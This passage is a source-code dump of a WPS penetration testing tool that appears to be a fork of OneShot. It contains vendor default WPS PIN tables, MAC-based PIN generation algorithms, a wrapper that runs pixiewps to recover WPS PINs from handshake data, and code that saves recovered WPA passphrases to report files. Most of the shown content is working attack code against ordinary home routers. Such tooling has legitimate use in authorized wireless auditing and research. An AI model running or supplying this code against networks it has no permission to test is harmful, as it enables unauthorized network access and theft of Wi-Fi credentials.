            subprocess.Popen(cmdline,
                shell=True, stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            logger.info(f"Restored process {pname}")
        except (OSError, subprocess.CalledProcessError) as e:
            logger.error(f"Failed to restore {pname}: {e}")

    try:
        os.remove(killed_file)
    except OSError:
        pass

def ifaceCtl(interface: str, action: str):
    """Put an interface up or down."""

    command = ['ip', 'link', 'set', f'{interface}', f'{action}']

    try:
        command_output = subprocess.run(command,
            encoding='utf-8', stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT
        )
    except (subprocess.CalledProcessError, FileNotFoundError) as error:
        logger.error(f'Can not control interface with ip link: \n {error}')

    command_output_stripped = command_output.stdout.strip()

    if isAndroid() is False:
        def _rfKillUnblock():
            rfkill_command = ['rfkill', 'unblock', 'wifi']

            if not which(rfkill_command[0]):
                logger.warning('rfkill utility is not available, unable to do anything')
                return

            try:
                subprocess.run(rfkill_command, check=True)
            except (subprocess.CalledProcessError, FileNotFoundError) as error:
                logger.error(f'Failed to unblock interface, not continuing: \n {error}')

        if 'RF-kill' in command_output_stripped:
            logger.warning('RF-kill is blocking the interface, unblocking')
            _rfKillUnblock()
            return

    if command_output.returncode != 0:
        logger.error(command_output_stripped)

    return command_output.returncode

def isInterfaceUp(interface: str) -> bool:
    """Check if the network interface is still up."""

    try:
        command = ['ip', 'link', 'show', interface]
        output = subprocess.run(command,
            encoding='utf-8', stdout=subprocess.PIPE,
            stderr=subprocess.PIPE, timeout=5
        )

        if output.returncode != 0:
            return False

        if 'UP' in output.stdout:
            return True

        return False

    except (OSError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
        return False

def addVulnerableAP(network_info: dict, vuln_list_file: str):
    """Add vulnerable device model/name to the vulnerable APs list."""

    if not network_info:
        return

    model = network_info.get('Model', '').strip()
    model_number = network_info.get('Model number', '').strip()
    device_name = network_info.get('Device name', '').strip()

    vuln_entry = None

    if model:
        vuln_entry = f'{model} {model_number}'.strip() if model_number else model
    elif device_name:
        vuln_entry = device_name

    if not vuln_entry:
        logger.warning('No model or device name information available to save')
        return

    try:
        # Check if entry already exists in the list
        try:
            with open(vuln_list_file, 'r', encoding='utf-8') as f:
                existing_entries = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            existing_entries = []

        if vuln_entry in existing_entries:
            logger.info(f'Device {vuln_entry} is already in the vulnerable list')
            return

        # Append entry to the vulnerable list
        with open(vuln_list_file, 'a', encoding='utf-8') as f:
            f.write(f'{vuln_entry}\n')
            logger.info(f'Added {vuln_entry} to vulnerable list')
    except IOError as e:
        logger.error(f'Failed to save to vulnerable list: {e}')

def isAndroid():
    """Check if this project is ran on android."""

    return bool(hasattr(sys, 'getandroidapilevel'))

def clearScreen():
    """Clear the terminal screen."""

    sys.stdout.write('\033[H\033[2J')
    sys.stdout.flush()

def die(text: str):
    """Print an error and exit with non-zero exit code."""

    sys.exit(f'[!] {text} \n')


# ============================================================================
# SOURCE: src/wifi/android.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import subprocess
import time

from src import logger

class AndroidNetwork:
    """Manages android Wi-Fi-related settings"""

    def __init__(self):
        self.ENABLED_SCANNING = 0

    def storeAlwaysScanState(self):
        """Stores Initial Wi-Fi 'always-scanning' state, so it can be restored on exit"""

        settings_cmd = ['settings', 'get', 'global', 'wifi_scan_always_enabled']

        try:
            is_scanning_on = subprocess.run(
                settings_cmd,
                encoding='utf-8',
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                check=True
            )
            is_scanning_on = is_scanning_on.stdout.strip()

            if is_scanning_on == '1':
                self.ENABLED_SCANNING = 1
        except subprocess.CalledProcessError:
            logger.info('[-] Failed to get initial Wi-Fi scanning state, assuming it\'s enabled')
            self.ENABLED_SCANNING = 1

    def disableWifi(self, force_disable: bool = False, whisper: bool = False):
        """Disable Wi-Fi connectivity on Android."""

        if whisper is False:
            logger.info('[*] Android: disabling Wi-Fi')

        wifi_disable_scanner_cmd = ['cmd', 'wifi', 'set-wifi-enabled', 'disabled']
        wifi_disable_always_scanning_cmd = ['cmd', '-w', 'wifi', 'set-scan-always-available', 'disabled']

        # Disable Android Wi-Fi scanner
        try:
            subprocess.run(wifi_disable_scanner_cmd)
        except subprocess.CalledProcessError:
            logger.info('[-] Failed to disable Wi-Fi scanner, skipping')

        # Always scanning for networks causes the interface to be occupied by android
        if self.ENABLED_SCANNING == 1 or force_disable is True:
            try:
                subprocess.run(wifi_disable_always_scanning_cmd)
            except subprocess.CalledProcessError:
                logger.info('[-] Failed to disable always-on Wi-Fi scanning, skipping')

        time.sleep(3)

    def enableWifi(self, force_enable: bool = False, whisper: bool = False):
        """Enable Wi-Fi connectivity on Android."""

        if whisper is False:
            logger.info('[*] Android: enabling Wi-Fi')

        wifi_enable_scanner_cmd = ['cmd', 'wifi', 'set-wifi-enabled', 'enabled']
        wifi_enable_always_scanning_cmd = ['cmd', '-w', 'wifi', 'set-scan-always-available', 'enabled']

        # Enable Android Wi-Fi scanner
        try:
            subprocess.run(wifi_enable_scanner_cmd)
        except subprocess.CalledProcessError:
            logger.info('[!] Failed to enable Wi-Fi scanner, skipping')

        if self.ENABLED_SCANNING == 1 or force_enable is True:
            try:
                subprocess.run(wifi_enable_always_scanning_cmd)
            except subprocess.CalledProcessError:
                logger.info('[-] Failed to enable always-on Wi-Fi scanning, skipping')


# ============================================================================
# SOURCE: src/wps/generator.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

from src import logger

class NetworkAddress:
    """Handles MAC addresses"""

    def __init__(self, mac):
        if isinstance(mac, int):
            self._INT_REPR = mac
            self._STR_REPR = self._int2mac(mac)
        elif isinstance(mac, str):
            self._STR_REPR = mac.replace('-', ':').replace('.', ':').upper()
            self._INT_REPR = self._mac2int(mac)

    @staticmethod
    def _mac2int(mac) -> int:
        """Converts MAC address to integer"""
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac) -> str:
        """Converts integer to MAC address"""
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i: i + 2] for i in range(0, 12, 2))
        return mac

    @property
    def STRING(self):
        return self._STR_REPR

    @STRING.setter
    def STRING(self, value):
        self._STR_REPR = value
        self._INT_REPR = self._mac2int(value)

    @property
    def INTEGER(self):
        return self._INT_REPR

    @INTEGER.setter
    def INTEGER(self, value):
        self._INT_REPR = value
        self._STR_REPR = self._int2mac(value)

    def __int__(self):
        return self.INTEGER

    def __str__(self):
        return self.STRING

    def __iadd__(self, other):
        self.INTEGER += other

    def __isub__(self, other):
        self.INTEGER -= other

    def __eq__(self, other):
        return self.INTEGER == other.INTEGER

    def __ne__(self, other):
        return self.INTEGER != other.INTEGER

    def __lt__(self, other):
        return self.INTEGER < other.INTEGER

    def __gt__(self, other):
        return self.INTEGER > other.INTEGER

    def __repr__(self):
        return f'NetworkAddress(string={self._STR_REPR}, integer={self._INT_REPR})'

class WPSpin:
    """WPS pin generator."""

    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.ALGOS = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self._pin24},
                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self._pin28},
                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self._pin32},
                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self._pinDLink},
                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self._pinDLink1},
                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self._pinASUS},
                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self._pinAirocon},
                      # Static pin algos
                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}

    def promptPin(self, bssid: str):
        """Prompts to select a WPS pin from a list of suggested pins."""

        pins = self._getSuggested(bssid)

        if len(pins) > 1:
            logger.info(f'PINs generated for {bssid}:')
            logger.info('{:<3} {:<10} {:<}'.format(
                '#', 'PIN', 'Name'
            ))

            for i, pin in enumerate(pins):
                number = f'{i + 1})'
                line = '{:<3} {:<10} {:<}'.format(
                    number, pin['pin'], pin['name'])
                logger.info(line)

            while True:
                pin_no = input('Select the PIN: ')
                try:
                    if int(pin_no) in range(1, len(pins) + 1):
                        pin = pins[int(pin_no) - 1]['pin']
                    else:
                        raise ValueError
                except ValueError:
                    logger.warning('Invalid number')
                else:
                    break

        elif len(pins) == 1:
            pin = pins[0]
            logger.info('The only probable PIN is selected: ' + pin['name'])
            pin = pin['pin']
        else:
            return None

        return pin

    def getLikely(self, bssid: str) -> list | None:
        """Returns a likely pin."""

        res = self._getSuggestedList(bssid)
        if res:
            return res[0]

        return None

    @staticmethod
    def checksum(pin: int) -> int:
        """Standard WPS checksum algorithm."""

        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    @staticmethod
    def _suggest(bssid: str) -> list:
        """Get algo suggestions for a BSSID."""

        mac = bssid.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)

        return res

    @staticmethod
    def _pin24(bssid: str):
        return bssid.INTEGER & 0xFFFFFF

    @staticmethod
    def _pin28(bssid: str):
        return bssid.INTEGER & 0xFFFFFFF

    @staticmethod
    def _pin32(bssid: str):
        return bssid.INTEGER % 0x100000000

    @staticmethod
    def _pinDLink(bssid: str):
        # Get the NIC part
        nic = bssid.INTEGER & 0xFFFFFF
        # Calculating pin
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)

        return pin

    @staticmethod
    def _pinASUS(bssid: str):
        b = [int(i, 16) for i in str(bssid).split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))

        return int(pin)

    @staticmethod
    def _pinAirocon(bssid: str):
        b = [int(i, 16) for i in str(bssid).split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)

        return pin

    def _pinDLink1(self, bssid: str):
        bssid.INTEGER += 1
        return self._pinDLink(bssid)

    def _generate(self, algo: str, bssid: str):
        """WPS pin generator."""

        mac = NetworkAddress(bssid)
        if algo not in self.ALGOS:
            raise ValueError('Invalid WPS pin algorithm')

        pin = self.ALGOS[algo]['gen'](mac)

        if algo == 'pinEmpty':
            return pin

        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def _getSuggested(self, bssid: str):
        """Get all suggested WPS pin's for single MAC."""

        algos = self._suggest(bssid)
        res = []
        for identification in algos:
            algo = self.ALGOS[identification]
            item = {}
            item['id'] = identification

            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']

            item['pin'] = self._generate(identification, bssid)
            res.append(item)
        return res

    def _getSuggestedList(self, bssid: str):
        """Get all suggested WPS pin's for single MAC as list."""

        algos = self._suggest(bssid)
        res = []
        for algo in algos:
            res.append(self._generate(algo, bssid))

        return res


# ============================================================================
# SOURCE: src/wps/pixiewps.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import subprocess

from src import logger

class Data:
    """Stored data used for pixiewps command."""

    def __init__(self):
        self.PKE = ''
        self.PKR = ''
        self.E_HASH1 = ''
        self.E_HASH2 = ''
        self.AUTHKEY = ''
        self.E_NONCE = ''
        self.R_NONCE = ''
        self.BSSID = ''

    def getAll(self):
        """Output all pixiewps related variables."""

        return all([self.PKE, self.PKR, self.E_NONCE, self.R_NONCE, self.AUTHKEY, self.E_HASH1, self.E_HASH2, self.BSSID])

    def runPixieWps(self, show_command: bool = False, full_range: bool = False) -> str | bool:
        """Runs the pixiewps and attempts to extract the WPS pin from the output."""

        logger.info('Running Pixiewps…')
        command = self._getPixieCmd(full_range)

        if show_command:
            # Convert the command array into a string
            logger.info(' '.join(command))

        try:
            command_output = subprocess.run(command,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding='utf-8'
            )
        except (subprocess.CalledProcessError, FileNotFoundError) as error:
            logger.error(f'Pixiewps has exited on error: \n {error}')
            return False

        print(command_output.stdout)

        if command_output.returncode == 0:
            lines = command_output.stdout.splitlines()
            for line in lines:
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()

                    if pin == '<empty>':
                        pin = '\'\''

                    return pin

        return False

    def _getPixieCmd(self, full_range: bool = False) -> list[str]:
        """Generates a list representing the command for the pixiewps tool."""

        pixiecmd = ['pixiewps']
        pixiecmd.extend([
            '--pke', self.PKE,
            '--pkr', self.PKR,
            '--e-hash1', self.E_HASH1,
            '--e-hash2', self.E_HASH2,
            '--authkey', self.AUTHKEY,
            '--e-nonce', self.E_NONCE,
            '--r-nonce', self.R_NONCE,
            '--e-bssid', self.BSSID
        ])

        # Enable all modes
        pixiecmd.extend(['--mode', '1,2,3,4,5'])

        if full_range:
            pixiecmd.append('--force')

        return pixiecmd

    def clear(self):
        """Resets the pixiewps variables."""
        self.__init__()


# ============================================================================
# SOURCE: src/wifi/collector.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import os
import subprocess
import csv

from datetime import datetime
from shutil import which
from src import logger

import src.wifi.android
import src.utils

class WiFiCollector:
    """Allows for collecting result, pin or network."""

    def __init__(self):
        self.ANDROID_NETWORK = src.wifi.android.AndroidNetwork()

    @staticmethod
    def writeResult(bssid: str, essid: str, wps_pin: str, wpa_psk: str):
        """Writes the success result to a stored.{txt,csv} file."""

        reports_dir = src.utils.REPORTS_DIR
        filename = reports_dir + 'stored'

        # Prevent duplicate writes if the BSSID + PSK combo already exists
        if os.path.isfile(filename + '.csv'):
            with open(filename + '.csv', 'r', encoding='utf-8') as file:
                if any(f'"{bssid}"' in line and f'"{wpa_psk}"' in line for line in file):
                    return logger.info(f'[*] Credentials for {essid} ({bssid}) are already saved.')

        if not os.path.exists(reports_dir):
            os.makedirs(reports_dir)

        write_table_header = not os.path.isfile(filename + '.csv')
        date_str = datetime.now().strftime('%d.%m.%Y %H:%M')

        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                date_str, bssid, essid, wps_pin, wpa_psk
            ))

        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
            csv_writer = csv.writer(file,
                delimiter=';', quoting=csv.QUOTE_ALL
            )

            if write_table_header:
                csv_writer.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])

            csv_writer.writerow([date_str, bssid, essid, wps_pin, wpa_psk])

        logger.info(f'[*] Credentials saved to {filename}.txt, {filename}.csv')

    @staticmethod
    def writePin(bssid: str, pin: str):
        """Writes PIN to a file for later use."""

        pixiewps_dir = src.utils.PIXIEWPS_DIR
        filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''

        with open(filename, 'w', encoding='utf-8') as file:
            file.write(pin)

        logger.info(f'[*] PIN saved in {filename}')


# ============================================================================
# SOURCE: src/wifi/scanner.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import re
import csv
import codecs
import subprocess

from src import logger
from src.utils import REPORTS_DIR

import src.args
import src.utils

args = src.args.parseArgs()

# --- Shared WPS regexes (used by both the scan table and the single-AP probe) ---
_RE_BSS    = re.compile(r'BSS (\S+)( )?\(on \w+\)')
_RE_SSID   = re.compile(r'SSID: (.*)')
_RE_WPS    = re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)')
_RE_WPS_V2 = re.compile(r' [*] Version2: (.+)')
_RE_WPS_LOCKED = re.compile(r' [*] AP setup locked: (0x[0-9]+)')
_RE_MODEL  = re.compile(r' [*] Model: (.*)')
_RE_MODEL_NUMBER = re.compile(r' [*] Model Number: (.*)')
_RE_DEVICE_NAME  = re.compile(r' [*] Device name: (.*)')

def classifyWpsState(network: dict) -> str:
    """Classify the WPS state of a scanned network.

    Returns one of:
      'enabled'  - AP advertises WPS (WPS IE present in beacon/probe response)
      'locked'   - WPS is enabled but the AP reports setup lock (temporary lockout)
      'disabled' - AP is present but does NOT advertise WPS (WPS disabled in firmware)
      'unknown'  - insufficient data
    """

    if network.get('WPS'):
        return 'locked' if network.get('WPS locked') else 'enabled'
    if network.get('BSSID'):
        return 'disabled'
    return 'unknown'

def probeWpsState(interface: str, bssid: str) -> dict | None:
    """Scan the air and report the over-the-air WPS state of a single BSSID.

    This runs a normal `iw scan` (the same active probing used by the scan flow)
    and extracts the target AP. It injects no frames and sends no WPS traffic of
    its own. Returns a parsed network dict, or None if the AP was not observed.
    """

    command = ['iw', 'dev', interface, 'scan']
    try:
        proc = subprocess.run(command,
            encoding='utf-8', stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            timeout=30
        )
    except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired) as error:
        logger.error(f'WPS capability probe failed: {error}')
        return None

    lines = proc.stdout.splitlines()

    if proc.returncode != 0 or any(line.startswith('command failed:') for line in lines):
        logger.error('WPS capability probe failed: iw scan returned an error')
        return None

    target = bssid.upper()
    network = {
        'BSSID': '',
        'ESSID': '',
